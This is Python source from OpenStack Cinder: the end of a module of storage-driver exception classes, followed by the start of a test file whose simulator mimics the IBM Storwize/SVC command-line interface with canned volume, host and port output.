class KeyPairExists(Duplicate):
    message = _(""Key pair %(key_name)s already exists."")


class VolumeTypeExists(Duplicate):
    message = _(""Volume Type %(id)s already exists."")


class MigrationError(CinderException):
    message = _(""Migration error"") + "": %(reason)s""


class MalformedRequestBody(CinderException):
    message = _(""Malformed message body: %(reason)s"")


class ConfigNotFound(NotFound):
    message = _(""Could not find config at %(path)s"")


class ParameterNotFound(NotFound):
    message = _(""Could not find parameter %(param)s"")


class PasteAppNotFound(NotFound):
    message = _(""Could not load paste app '%(name)s' from %(path)s"")


class NoValidHost(CinderException):
    message = _(""No valid host was found. %(reason)s"")


class WillNotSchedule(CinderException):
    message = _(""Host %(host)s is not up or doesn't exist."")


class QuotaError(CinderException):
    message = _(""Quota exceeded"") + "": code=%(code)s""
    code = 413
    headers = {'Retry-After': 0}
    safe = True


class VolumeSizeExceedsAvailableQuota(QuotaError):
    message = _(""Requested volume or snapshot exceeds ""
                ""allowed Gigabytes quota"")


class VolumeSizeExceedsQuota(QuotaError):
    message = _(""Maximum volume/snapshot size exceeded"")


class VolumeLimitExceeded(QuotaError):
    message = _(""Maximum number of volumes allowed (%(allowed)d) exceeded"")


class SnapshotLimitExceeded(QuotaError):
    message = _(""Maximum number of snapshots allowed (%(allowed)d) exceeded"")


class DuplicateSfVolumeNames(Duplicate):
    message = _(""Detected more than one volume with name %(vol_name)s"")


class Duplicate3PARHost(CinderException):
    message = _(""3PAR Host already exists: %(err)s.  %(info)s"")


class Invalid3PARDomain(CinderException):
    message = _(""Invalid 3PAR Domain: %(err)s"")


class VolumeTypeCreateFailed(CinderException):
    message = _(""Cannot create volume_type with ""
                ""name %(name)s and specs %(extra_specs)s"")


class SolidFireAPIException(CinderException):
    message = _(""Bad response from SolidFire API"")


class SolidFireAPIDataException(SolidFireAPIException):
    message = _(""Error in SolidFire API response: data=%(data)s"")


class UnknownCmd(Invalid):
    message = _(""Unknown or unsupported command %(cmd)s"")


class MalformedResponse(Invalid):
    message = _(""Malformed response to command %(cmd)s: %(reason)s"")


class BadHTTPResponseStatus(CinderException):
    message = _(""Bad HTTP response status %(status)s"")


class FailedCmdWithDump(CinderException):
    message = _(""Operation failed with status=%(status)s. Full dump: %(data)s"")


class ZadaraServerCreateFailure(CinderException):
    message = _(""Unable to create server object for initiator %(name)s"")


class ZadaraServerNotFound(NotFound):
    message = _(""Unable to find server object for initiator %(name)s"")


class ZadaraVPSANoActiveController(CinderException):
    message = _(""Unable to find any active VPSA controller"")


class ZadaraAttachmentsNotFound(NotFound):
    message = _(""Failed to retrieve attachments for volume %(name)s"")


class ZadaraInvalidAttachmentInfo(Invalid):
    message = _(""Invalid attachment info for volume %(name)s: %(reason)s"")


class InstanceNotFound(NotFound):
    message = _(""Instance %(instance_id)s could not be found."")


class VolumeBackendAPIException(CinderException):
    message = _(""Bad or unexpected response from the storage volume ""
                ""backend API: %(data)s"")


class NfsException(CinderException):
    message = _(""Unknown NFS exception"")


class NfsNoSharesMounted(NotFound):
    message = _(""No mounted NFS shares found"")


class NfsNoSuitableShareFound(NotFound):
    message = _(""There is no share which can host %(volume_size)sG"")


class GlusterfsException(CinderException):
    message = _(""Unknown Gluster exception"")


class GlusterfsNoSharesMounted(NotFound):
    message = _(""No mounted Gluster shares found"")


class GlusterfsNoSuitableShareFound(NotFound):
    message = _(""There is no share which can host %(volume_size)sG"")


class GlanceMetadataExists(Invalid):
    message = _(""Glance metadata cannot be updated, key %(key)s""
                "" exists for volume id %(volume_id)s"")


class ImageCopyFailure(Invalid):
    message = _(""Failed to copy image to volume: %(reason)s"")


class BackupInvalidCephArgs(Invalid):
    message = _(""Invalid Ceph args provided for backup rbd operation"")


class BackupOperationError(Invalid):
    message = _(""An error has occurred during backup operation"")


class BackupRBDOperationFailed(Invalid):
    message = _(""Backup RBD operation failed"")


class BackupVolumeInvalidType(Invalid):
    message = _(""Backup volume %(volume_id)s type not recognised."")


class BackupNotFound(NotFound):
    message = _(""Backup %(backup_id)s could not be found."")


class InvalidBackup(Invalid):
    message = _(""Invalid backup: %(reason)s"")


class SwiftConnectionFailed(CinderException):
    message = _(""Connection to swift failed"") + "": %(reason)s""


class TransferNotFound(NotFound):
    message = _(""Transfer %(transfer_id)s could not be found."")


class VolumeMigrationFailed(CinderException):
    message = _(""Volume migration failed"") + "": %(reason)s""


class ProtocolNotSupported(CinderException):
    message = _(""Connect to volume via protocol %(protocol)s not supported."")


class SSHInjectionThreat(CinderException):
    message = _(""SSH command injection detected"") + "": %(command)s""
/n/n/ncinder/tests/test_storwize_svc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2013 IBM Corp.
# Copyright 2012 OpenStack LLC.
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Authors:
#   Ronen Kat <ronenkat@il.ibm.com>
#   Avishay Traeger <avishay@il.ibm.com>

""""""
Tests for the IBM Storwize family and SVC volume driver.
""""""


import random
import re
import socket

from cinder.brick.initiator import connector
from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import test
from cinder import units
from cinder import utils
from cinder.volume import configuration as conf
from cinder.volume.drivers import storwize_svc
from cinder.volume import volume_types


LOG = logging.getLogger(__name__)


class StorwizeSVCFakeDB:
    def __init__(self):
        self.volume = None

    def volume_get(self, context, vol_id):
        return self.volume

    def volume_set(self, vol):
        self.volume = vol


class StorwizeSVCManagementSimulator:
    def __init__(self, pool_name):
        self._flags = {'storwize_svc_volpool_name': pool_name}
        self._volumes_list = {}
        self._hosts_list = {}
        self._mappings_list = {}
        self._fcmappings_list = {}
        self._next_cmd_error = {
            'lsportip': '',
            'lsfabric': '',
            'lsiscsiauth': '',
            'lsnodecanister': '',
            'mkvdisk': '',
            'lsvdisk': '',
            'lsfcmap': '',
            'prestartfcmap': '',
            'startfcmap': '',
            'rmfcmap': '',
            'lslicense': '',
        }
        self._errors = {
            'CMMVC5701E': ('', 'CMMVC5701E No object ID was specified.'),
            'CMMVC6035E': ('', 'CMMVC6035E The action failed as the '
                               'object already exists.'),
            'CMMVC5753E': ('', 'CMMVC5753E The specified object does not '
                               'exist or is not a suitable candidate.'),
            'CMMVC5707E': ('', 'CMMVC5707E Required parameters are missing.'),
            'CMMVC6581E': ('', 'CMMVC6581E The command has failed because '
                               'the maximum number of allowed iSCSI '
                               'qualified names (IQNs) has been reached, '
                               'or the IQN is already assigned or is not '
                               'valid.'),
            'CMMVC5754E': ('', 'CMMVC5754E The specified object does not '
                               'exist, or the name supplied does not meet '
                               'the naming rules.'),
            'CMMVC6071E': ('', 'CMMVC6071E The VDisk-to-host mapping was '
                               'not created because the VDisk is already '
                               'mapped to a host.'),
            'CMMVC5879E': ('', 'CMMVC5879E The VDisk-to-host mapping was '
                               'not created because a VDisk is already '
                               'mapped to this host with this SCSI LUN.'),
            'CMMVC5840E': ('', 'CMMVC5840E The virtual disk (VDisk) was '
                               'not deleted because it is mapped to a '
                               'host or because it is part of a FlashCopy '
                               'or Remote Copy mapping, or is involved in '
                               'an image mode migrate.'),
            'CMMVC6527E': ('', 'CMMVC6527E The name that you have entered '
                               'is not valid. The name can contain letters, '
                               'numbers, spaces, periods, dashes, and '
                               'underscores. The name must begin with a '
                               'letter or an underscore. The name must not '
                               'begin or end with a space.'),
            'CMMVC5871E': ('', 'CMMVC5871E The action failed because one or '
                               'more of the configured port names is in a '
                               'mapping.'),
            'CMMVC5924E': ('', 'CMMVC5924E The FlashCopy mapping was not '
                               'created because the source and target '
                               'virtual disks (VDisks) are different sizes.'),
            'CMMVC6303E': ('', 'CMMVC6303E The create failed because the '
                               'source and target VDisks are the same.'),
            'CMMVC7050E': ('', 'CMMVC7050E The command failed because at '
                               'least one node in the I/O group does not '
                               'support compressed VDisks.'),
            # Catch-all for invalid state transitions:
            'CMMVC5903E': ('', 'CMMVC5903E The FlashCopy mapping was not '
                               'changed because the mapping or consistency '
                               'group is another state.'),
        }
        self._transitions = {'begin': {'make': 'idle_or_copied'},
                             'idle_or_copied': {'prepare': 'preparing',
                                                'delete': 'end',
                                                'delete_force': 'end'},
                             'preparing': {'flush_failed': 'stopped',
                                           'wait': 'prepared'},
                             'end': None,
                             'stopped': {'prepare': 'preparing',
                                         'delete_force': 'end'},
                             'prepared': {'stop': 'stopped',
                                          'start': 'copying'},
                             'copying': {'wait': 'idle_or_copied',
                                         'stop': 'stopping'},
                             # Assume the worst case where stopping->stopped
                             # rather than stopping idle_or_copied
                             'stopping': {'wait': 'stopped'},
                             }

    def _state_transition(self, function, fcmap):
        if (function == 'wait' and
                'wait' not in self._transitions[fcmap['status']]):
            return ('', '')

        if fcmap['status'] == 'copying' and function == 'wait':
            if fcmap['copyrate'] != '0':
                if fcmap['progress'] == '0':
                    fcmap['progress'] = '50'
                else:
                    fcmap['progress'] = '100'
                    fcmap['status'] = 'idle_or_copied'
            return ('', '')
        else:
            try:
                curr_state = fcmap['status']
                fcmap['status'] = self._transitions[curr_state][function]
                return ('', '')
            except Exception:
                return self._errors['CMMVC5903E']

    # Find an unused ID
    def _find_unused_id(self, d):
        ids = []
        for k, v in d.iteritems():
            ids.append(int(v['id']))
        ids.sort()
        for index, n in enumerate(ids):
            if n > index:
                return str(index)
        return str(len(ids))

    # Check if name is valid
    def _is_invalid_name(self, name):
        if re.match(""^[a-zA-Z_][\w ._-]*$"", name):
            return False
        return True

    # Convert argument string to dictionary
    def _cmd_to_dict(self, arg_list):
        no_param_args = [
            'autodelete',
            'autoexpand',
            'bytes',
            'compressed',
            'force',
            'nohdr',
        ]
        one_param_args = [
            'chapsecret',
            'cleanrate',
            'copyrate',
            'delim',
            'filtervalue',
            'grainsize',
            'hbawwpn',
            'host',
            'iogrp',
            'iscsiname',
            'mdiskgrp',
            'name',
            'rsize',
            'scsi',
            'size',
            'source',
            'target',
            'unit',
            'easytier',
            'warning',
            'wwpn',
        ]

        # Handle the special case of lsnode which is a two-word command
        # Use the one word version of the command internally
        if arg_list[0] in ('svcinfo', 'svctask'):
            if arg_list[1] == 'lsnode':
                if len(arg_list) > 4:  # e.g. svcinfo lsnode -delim ! <node id>
                    ret = {'cmd': 'lsnode', 'node_id': arg_list[-1]}
                else:
                    ret = {'cmd': 'lsnodecanister'}
            else:
                ret = {'cmd': arg_list[1]}
            arg_list.pop(0)
        else:
            ret = {'cmd': arg_list[0]}

        skip = False
        for i in range(1, len(arg_list)):
            if skip:
                skip = False
                continue
            if arg_list[i][0] == '-':
                if arg_list[i][1:] in no_param_args:
                    ret[arg_list[i][1:]] = True
                elif arg_list[i][1:] in one_param_args:
                    ret[arg_list[i][1:]] = arg_list[i + 1]
                    skip = True
                else:
                    raise exception.InvalidInput(
                        reason=_('unrecognized argument %s') % arg_list[i])
            else:
                ret['obj'] = arg_list[i]
        return ret

    def _print_info_cmd(self, rows, delim=' ', nohdr=False, **kwargs):
        """"""Generic function for printing information.""""""
        if nohdr:
            del rows[0]

        for index in range(len(rows)):
            rows[index] = delim.join(rows[index])
        return ('%s' % '\n'.join(rows), '')

    def _print_info_obj_cmd(self, header, row, delim=' ', nohdr=False):
        """"""Generic function for printing information for a specific object.""""""
        objrows = []
        for idx, val in enumerate(header):
            objrows.append([val, row[idx]])

        if nohdr:
            for index in range(len(objrows)):
                objrows[index] = ' '.join(objrows[index][1:])
        for index in range(len(objrows)):
            objrows[index] = delim.join(objrows[index])
        return ('%s' % '\n'.join(objrows), '')

    def _convert_bytes_units(self, bytestr):
        num = int(bytestr)
        unit_array = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
        unit_index = 0

        while num > 1024:
            num = num / 1024
            unit_index += 1

        return '%d%s' % (num, unit_array[unit_index])

    def _convert_units_bytes(self, num, unit):
        unit_array = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
        unit_index = 0

        while unit.lower() != unit_array[unit_index].lower():
            num = num * 1024
            unit_index += 1

        return str(num)

    def _cmd_lslicense(self, **kwargs):
        rows = [None] * 3
        rows[0] = ['used_compression_capacity', '0.08']
        rows[1] = ['license_compression_capacity', '0']
        if self._next_cmd_error['lslicense'] == 'no_compression':
            self._next_cmd_error['lslicense'] = ''
            rows[2] = ['license_compression_enclosures', '0']
        else:
            rows[2] = ['license_compression_enclosures', '1']
        return self._print_info_cmd(rows=rows, **kwargs)

    # Print mostly made-up stuff in the correct syntax
    def _cmd_lssystem(self, **kwargs):
        rows = [None] * 2
        rows[0] = ['id', '0123456789ABCDEF']
        rows[1] = ['name', 'storwize-svc-sim']
        return self._print_info_cmd(rows=rows, **kwargs)

    # Print mostly made-up stuff in the correct syntax, assume -bytes passed
    def _cmd_lsmdiskgrp(self, **kwargs):
        rows = [None] * 3
        rows[0] = ['id', 'name', 'status', 'mdisk_count',
                   'vdisk_count', 'capacity', 'extent_size',
                   'free_capacity', 'virtual_capacity', 'used_capacity',
                   'real_capacity', 'overallocation', 'warning',
                   'easy_tier', 'easy_tier_status']
        rows[1] = ['1', self._flags['storwize_svc_volpool_name'], 'online',
                   '1', str(len(self._volumes_list)), '3573412790272',
                   '256', '3529926246400', '1693247906775', '277841182',
                   '38203734097', '47', '80', 'auto', 'inactive']
        rows[2] = ['2', 'volpool2', 'online',
                   '1', '0', '3573412790272', '256',
                   '3529432325160', '1693247906775', '277841182',
                   '38203734097', '47', '80', 'auto', 'inactive']
        if 'obj' not in kwargs:
            return self._print_info_cmd(rows=rows, **kwargs)
        else:
            if kwargs['obj'] == self._flags['storwize_svc_volpool_name']:
                row = rows[1]
            elif kwargs['obj'] == 'volpool2':
                row = rows[2]
            else:
                return self._errors['CMMVC5754E']

            objrows = []
            for idx, val in enumerate(rows[0]):
                objrows.append([val, row[idx]])

            if 'nohdr' in kwargs:
                for index in range(len(objrows)):
                    objrows[index] = ' '.join(objrows[index][1:])

            if 'delim' in kwargs:
                for index in range(len(objrows)):
                    objrows[index] = kwargs['delim'].join(objrows[index])

            return ('%s' % '\n'.join(objrows), '')

    # Print mostly made-up stuff in the correct syntax
    def _cmd_lsnodecanister(self, **kwargs):
        rows = [None] * 3
        rows[0] = ['id', 'name', 'UPS_serial_number', 'WWNN', 'status',
                   'IO_group_id', 'IO_group_name', 'config_node',
                   'UPS_unique_id', 'hardware', 'iscsi_name', 'iscsi_alias',
                   'panel_name', 'enclosure_id', 'canister_id',
                   'enclosure_serial_number']
        rows[1] = ['1', 'node1', '', '123456789ABCDEF0', 'online', '0',
                   'io_grp0',
                   'yes', '123456789ABCDEF0', '100',
                   'iqn.1982-01.com.ibm:1234.sim.node1', '', '01-1', '1', '1',
                   '0123ABC']
        rows[2] = ['2', 'node2', '', '123456789ABCDEF1', 'online', '0',
                   'io_grp0',
                   'no', '123456789ABCDEF1', '100',
                   'iqn.1982-01.com.ibm:1234.sim.node2', '', '01-2', '1', '2',
                   '0123ABC']

        if self._next_cmd_error['lsnodecanister'] == 'header_mismatch':
            rows[0].pop(2)
            self._next_cmd_error['lsnodecanister'] = ''
        if self._next_cmd_error['lsnodecanister'] == 'remove_field':
            for row in rows:
                row.pop(0)
            self._next_cmd_error['lsnodecanister'] = ''

        return self._print_info_cmd(rows=rows, **kwargs)

    # Print information of every single node of SVC
    def _cmd_lsnode(self, **kwargs):
        node_infos = dict()
        node_infos['1'] = r'''id!1
name!node1
port_id!500507680210C744
port_status!active
port_speed!8Gb
port_id!500507680220C744
port_status!active
port_speed!8Gb
'''
        node_infos['2'] = r'''id!2
name!node2
port_id!500507680220C745
port_status!active
port_speed!8Gb
port_id!500507680230C745
port_status!inactive
port_speed!N/A
'''
        node_id = kwargs.get('node_id', None)
        stdout = node_infos.get(node_id, '')
        return stdout, ''

    # Print mostly made-up stuff in the correct syntax
    def _cmd_lsportip(self, **kwargs):
        if self._next_cmd_error['lsportip'] == 'ip_no_config':
            self._next_cmd_error['lsportip'] = ''
            ip_addr1 = ''
            ip_addr2 = ''
            gw = ''
        else:
            ip_addr1 = '1.234.56.78'
            ip_addr2 = '1.234.56.79'
            gw = '1.234.56.1'

        rows = [None] * 17
        rows[0] = ['id', 'node_id', 'node_name', 'IP_address', 'mask',
                   'gateway', 'IP_address_6', 'prefix_6', 'gateway_6', 'MAC',
                   'duplex', 'state', 'speed', 'failover']
        rows[1] = ['1', '1', 'node1', ip_addr1, '255.255.255.0',
                   gw, '', '', '', '01:23:45:67:89:00', 'Full',
                   'online', '1Gb/s', 'no']
        rows[2] = ['1', '1', 'node1', '', '', '', '', '', '',
                   '01:23:45:67:89:00', 'Full', 'online', '1Gb/s', 'yes']
        rows[3] = ['2', '1', 'node1', '', '', '', '', '', '',
                   '01:23:45:67:89:01', 'Full', 'unconfigured', '1Gb/s', 'no']
        rows[4] = ['2', '1', 'node1', '', '', '', '', '', '',
                   '01:23:45:67:89:01', 'Full', 'unconfigured', '1Gb/s', 'yes']
        rows[5] = ['3', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'no']
        rows[6] = ['3', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'yes']
        rows[7] = ['4', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'no']
        rows[8] = ['4', '1', 'node1', '', '', '', '', '', '', '', '',
                   'unconfigured', '', 'yes']
        rows[9] = ['1', '2', 'node2', ip_addr2, '255.255.255.0',
                   gw, '', '', '', '01:23:45:67:89:02', 'Full',
                   'online', '1Gb/s', 'no']
        rows[10] = ['1', '2', 'node2', '', '', '', '', '', '',
                    '01:23:45:67:89:02', 'Full', 'online', '1Gb/s', 'yes']
        rows[11] = ['2', '2', 'node2', '', '', '', '', '', '',
                    '01:23:45:67:89:03', 'Full', 'unconfigured', '1Gb/s', 'no']
        rows[12] = ['2', '2', 'node2', '', '', '', '', '', '',
                    '01:23:45:67:89:03', 'Full', 'unconfigured', '1Gb/s',
                    'yes']
        rows[13] = ['3', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'no']
        rows[14] = ['3', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'yes']
        rows[15] = ['4', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'no']
        rows[16] = ['4', '2', 'node2', '', '', '', '', '', '', '', '',
                    'unconfigured', '', 'yes']

        if self._next_cmd_error['lsportip'] == 'header_mismatch':
            rows[0].pop(2)
            self._next_cmd_error['lsportip'] = ''
        if self._next_cmd_error['lsportip'] == 'remove_field':
            for row in rows:
                row.pop(1)
            self._next_cmd_error['lsportip'] = ''

        return self._print_info_cmd(rows=rows, **kwargs)

    def _cmd_lsfabric(self, **kwargs):
        host_name = kwargs['host'] if 'host' in kwargs else None
        target_wwpn = kwargs['wwpn'] if 'wwpn' in kwargs else None
        host_infos = []

        for hk, hv in self._hosts_list.iteritems():
            if not host_name or hv['host_name'] == host_name:
                for mk, mv in self._mappings_list.iteritems():
                    if mv['host'] == hv['host_name']:
                        if not target_wwpn or target_wwpn in hv['wwpns']:
                            host_infos.append(hv)
                            break

        if not len(host_infos):
            return ('', '')

        rows = []
        rows.append(['remote_wwpn', 'remote_nportid', 'id', 'node_name',
                     'local_wwpn', 'local_port', 'local_nportid', 'state',
                     'name', 'cluster_name', 'type'])
        for host_info in host_infos:
            for wwpn in host_info['wwpns']:
                rows.append([wwpn, '123456', host_info['id'], 'nodeN',
                            'AABBCCDDEEFF0011', '1', '0123ABC', 'active',
                            host_info['host_name'], '', 'host'])

        if self._next_cmd_error['lsfabric'] == 'header_mismatch':
            rows[0].pop(0)
            self._next_cmd_error['lsfabric'] = ''
        if self._next_cmd_error['lsfabric'] == 'remove_field':
            for row in rows:
                row.pop(0)
            self._next_cmd_error['lsfabric'] = ''
        return self._print_info_cmd(rows=rows, **kwargs)

    # Create a vdisk
    def _cmd_mkvdisk(self, **kwargs):
        # We only save the id/uid, name, and size - all else will be made up
        volume_info = {}
        volume_info['id'] = self._find_unused_id(self._volumes_list)
        volume_info['uid'] = ('ABCDEF' * 3) + ('0' * 14) + volume_info['id']

        if 'name' in kwargs:
            volume_info['name'] = kwargs['name'].strip('\'\'')
        else:
            volume_info['name'] = 'vdisk' + volume_info['id']

        # Assume size and unit are given, store it in bytes
        capacity = int(kwargs['size'])
        unit = kwargs['unit']
        volume_info['capacity'] = self._convert_units_bytes(capacity, unit)

        if 'easytier' in kwargs:
            if kwargs['easytier'] == 'on':
                volume_info['easy_tier'] = 'on'
            else:
                volume_info['easy_tier'] = 'off'

        if 'rsize' in kwargs:
            # Fake numbers
            volume_info['used_capacity'] = '786432'
            volume_info['real_capacity'] = '21474816'
            volume_info['free_capacity'] = '38219264'
            if 'warning' in kwargs:
                volume_info['warning'] = kwargs['warning'].rstrip('%')
            else:
                volume_info['warning'] = '80'
            if 'autoexpand' in kwargs:
                volume_info['autoexpand'] = 'on'
            else:
                volume_info['autoexpand'] = 'off'
            if 'grainsize' in kwargs:
                volume_info['grainsize'] = kwargs['grainsize']
            else:
                volume_info['grainsize'] = '32'
            if 'compressed' in kwargs:
                volume_info['compressed_copy'] = 'yes'
            else:
                volume_info['compressed_copy'] = 'no'
        else:
            volume_info['used_capacity'] = volume_info['capacity']
            volume_info['real_capacity'] = volume_info['capacity']
            volume_info['free_capacity'] = '0'
            volume_info['warning'] = ''
            volume_info['autoexpand'] = ''
            volume_info['grainsize'] = ''
            volume_info['compressed_copy'] = 'no'

        if volume_info['name'] in self._volumes_list:
            return self._errors['CMMVC6035E']
        else:
            self._volumes_list[volume_info['name']] = volume_info
            return ('Virtual Disk, id [%s], successfully created' %
                    (volume_info['id']), '')

    # Delete a vdisk
    def _cmd_rmvdisk(self, **kwargs):
        force = True if 'force' in kwargs else False

        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        vol_name = kwargs['obj'].strip('\'\'')

        if vol_name not in self._volumes_list:
            return self._errors['CMMVC5753E']

        if not force:
            for k, mapping in self._mappings_list.iteritems():
                if mapping['vol'] == vol_name:
                    return self._errors['CMMVC5840E']
            for k, fcmap in self._fcmappings_list.iteritems():
                if ((fcmap['source'] == vol_name) or
                        (fcmap['target'] == vol_name)):
                    return self._errors['CMMVC5840E']

        del self._volumes_list[vol_name]
        return ('', '')

    def _cmd_expandvdisksize(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        vol_name = kwargs['obj'].strip('\'\'')

        # Assume unit is gb
        if 'size' not in kwargs:
            return self._errors['CMMVC5707E']
        size = int(kwargs['size'])

        if vol_name not in self._volumes_list:
            return self._errors['CMMVC5753E']

        curr_size = int(self._volumes_list[vol_name]['capacity'])
        addition = size * units.GiB
        self._volumes_list[vol_name]['capacity'] = str(curr_size + addition)
        return ('', '')

    def _get_fcmap_info(self, vol_name):
        ret_vals = {
            'fc_id': '',
            'fc_name': '',
            'fc_map_count': '0',
        }
        for k, fcmap in self._fcmappings_list.iteritems():
            if ((fcmap['source'] == vol_name) or
                    (fcmap['target'] == vol_name)):
                ret_vals['fc_id'] = fcmap['id']
                ret_vals['fc_name'] = fcmap['name']
                ret_vals['fc_map_count'] = '1'
        return ret_vals

    # List information about vdisks
    def _cmd_lsvdisk(self, **kwargs):
        rows = []
        rows.append(['id', 'name', 'IO_group_id', 'IO_group_name',
                     'status', 'mdisk_grp_id', 'mdisk_grp_name',
                     'capacity', 'type', 'FC_id', 'FC_name', 'RC_id',
                     'RC_name', 'vdisk_UID', 'fc_map_count', 'copy_count',
                     'fast_write_state', 'se_copy_count', 'RC_change'])

        for k, vol in self._volumes_list.iteritems():
            if (('filtervalue' not in kwargs) or
                    (kwargs['filtervalue'] == 'name=' + vol['name'])):
                fcmap_info = self._get_fcmap_info(vol['name'])

                if 'bytes' in kwargs:
                    cap = self._convert_bytes_units(vol['capacity'])
                else:
                    cap = vol['capacity']
                rows.append([str(vol['id']), vol['name'], '0', 'io_grp0',
                            'online', '0',
                            self._flags['storwize_svc_volpool_name'],
                            cap, 'striped',
                            fcmap_info['fc_id'], fcmap_info['fc_name'],
                            '', '', vol['uid'],
                            fcmap_info['fc_map_count'], '1', 'empty',
                            '1', 'no'])

        if 'obj' not in kwargs:
            return self._print_info_cmd(rows=rows, **kwargs)
        else:
            if kwargs['obj'] not in self._volumes_list:
                return self._errors['CMMVC5754E']
            vol = self._volumes_list[kwargs['obj']]
            fcmap_info = self._get_fcmap_info(vol['name'])
            cap = vol['capacity']
            cap_u = vol['used_capacity']
            cap_r = vol['real_capacity']
            cap_f = vol['free_capacity']
            if 'bytes' not in kwargs:
                for item in [cap, cap_u, cap_r, cap_f]:
                    item = self._convert_bytes_units(item)
            rows = []

            rows.append(['id', str(vol['id'])])
            rows.append(['name', vol['name']])
            rows.append(['IO_group_id', '0'])
            rows.append(['IO_group_name', 'io_grp0'])
            rows.append(['status', 'online'])
            rows.append(['mdisk_grp_id', '0'])
            rows.append([
                'mdisk_grp_name',
                self._flags['storwize_svc_volpool_name']])
            rows.append(['capacity', cap])
            rows.append(['type', 'striped'])
            rows.append(['formatted', 'no'])
            rows.append(['mdisk_id', ''])
            rows.append(['mdisk_name', ''])
            rows.append(['FC_id', fcmap_info['fc_id']])
            rows.append(['FC_name', fcmap_info['fc_name']])
            rows.append(['RC_id', ''])
            rows.append(['RC_name', ''])
            rows.append(['vdisk_UID', vol['uid']])
            rows.append(['throttling', '0'])

            if self._next_cmd_error['lsvdisk'] == 'blank_pref_node':
                rows.append(['preferred_node_id', ''])
                self._next_cmd_error['lsvdisk'] = ''
            elif self._next_cmd_error['lsvdisk'] == 'no_pref_node':
                self._next_cmd_error['lsvdisk'] = ''
            else:
                rows.append(['preferred_node_id', '1'])
            rows.append(['fast_write_state', 'empty'])
            rows.append(['cache', 'readwrite'])
            rows.append(['udid', ''])
            rows.append(['fc_map_count', fcmap_info['fc_map_count']])
            rows.append(['sync_rate', '50'])
            rows.append(['copy_count', '1'])
            rows.append(['se_copy_count', '0'])
            rows.append(['mirror_write_priority', 'latency'])
            rows.append(['RC_change', 'no'])
            rows.append(['used_capacity', cap_u])
            rows.append(['real_capacity', cap_r])
            rows.append(['free_capacity', cap_f])
            rows.append(['autoexpand', vol['autoexpand']])
            rows.append(['warning', vol['warning']])
            rows.append(['grainsize', vol['grainsize']])
            rows.append(['easy_tier', vol['easy_tier']])
            rows.append(['compressed_copy', vol['compressed_copy']])

            if 'nohdr' in kwargs:
                for index in range(len(rows)):
                    rows[index] = ' '.join(rows[index][1:])

            if 'delim' in kwargs:
                for index in range(len(rows)):
                    rows[index] = kwargs['delim'].join(rows[index])

            return ('%s' % '\n'.join(rows), '')

    def _add_port_to_host(self, host_info, **kwargs):
        if 'iscsiname' in kwargs:
            added_key = 'iscsi_names'
            added_val = kwargs['iscsiname'].strip('\'\""')
        elif 'hbawwpn' in kwargs:
            added_key = 'wwpns'
            added_val = kwargs['hbawwpn'].strip('\'\""')
        else:
            return self._errors['CMMVC5707E']

        host_info[added_key].append(added_val)

        for k, v in self._hosts_list.iteritems():
            if v['id'] == host_info['id']:
                continue
            for port in v[added_key]:
                if port == added_val:
                    return self._errors['CMMVC6581E']
        return ('', '')

    # Make a host
    def _cmd_mkhost(self, **kwargs):
        host_info = {}
        host_info['id'] = self._find_unused_id(self._hosts_list)

        if 'name' in kwargs:
            host_name = kwargs['name'].strip('\'\""')
        else:
            host_name = 'host' + str(host_info['id'])

        if self._is_invalid_name(host_name):
            return self._errors['CMMVC6527E']

        if host_name in self._hosts_list:
            return self._errors['CMMVC6035E']

        host_info['host_name'] = host_name
        host_info['iscsi_names'] = []
        host_info['wwpns'] = []

        out, err = self._add_port_to_host(host_info, **kwargs)
        if not len(err):
            self._hosts_list[host_name] = host_info
            return ('Host, id [%s], successfully created' %
                    (host_info['id']), '')
        else:
            return (out, err)

    # Add ports to an existing host
    def _cmd_addhostport(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        host_name = kwargs['obj'].strip('\'\'')

        if host_name not in self._hosts_list:
            return self._errors['CMMVC5753E']

        host_info = self._hosts_list[host_name]
        return self._add_port_to_host(host_info, **kwargs)

    # Change host properties
    def _cmd_chhost(self, **kwargs):
        if 'chapsecret' not in kwargs:
            return self._errors['CMMVC5707E']
        secret = kwargs['obj'].strip('\'\'')

        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        host_name = kwargs['obj'].strip('\'\'')

        if host_name not in self._hosts_list:
            return self._errors['CMMVC5753E']

        self._hosts_list[host_name]['chapsecret'] = secret
        return ('', '')

    # Remove a host
    def _cmd_rmhost(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']

        host_name = kwargs['obj'].strip('\'\'')
        if host_name not in self._hosts_list:
            return self._errors['CMMVC5753E']

        for k, v in self._mappings_list.iteritems():
            if (v['host'] == host_name):
                return self._errors['CMMVC5871E']

        del self._hosts_list[host_name]
        return ('', '')

    # List information about hosts
    def _cmd_lshost(self, **kwargs):
        if 'obj' not in kwargs:
            rows = []
            rows.append(['id', 'name', 'port_count', 'iogrp_count', 'status'])

            found = False
            for k, host in self._hosts_list.iteritems():
                filterstr = 'name=' + host['host_name']
                if (('filtervalue' not in kwargs) or
                        (kwargs['filtervalue'] == filterstr)):
                    rows.append([host['id'], host['host_name'], '1', '4',
                                'offline'])
                    found = True
            if found:
                return self._print_info_cmd(rows=rows, **kwargs)
            else:
                return ('', '')
        else:
            if kwargs['obj'] not in self._hosts_list:
